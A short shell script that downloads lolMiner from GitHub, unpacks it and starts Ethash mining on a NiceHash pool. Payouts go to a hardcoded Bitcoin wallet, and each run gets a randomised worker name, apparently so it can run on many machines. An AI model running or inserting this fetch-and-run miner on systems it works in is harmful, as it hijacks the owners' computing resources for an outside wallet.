sudo apt-get update -y
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
tar -xf lolMiner_v1.29_Lin64.tar.gz
cd 1.29 && ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.hk.nicehash.com:3353 --user 3QAbQX6ggoZ8MXrQMpuGkr4AFfdpdpfo3G.GPU-Win-$(echo $(shuf -i 1-99 -n 1))--vapers --ethstratum ETHPROXY
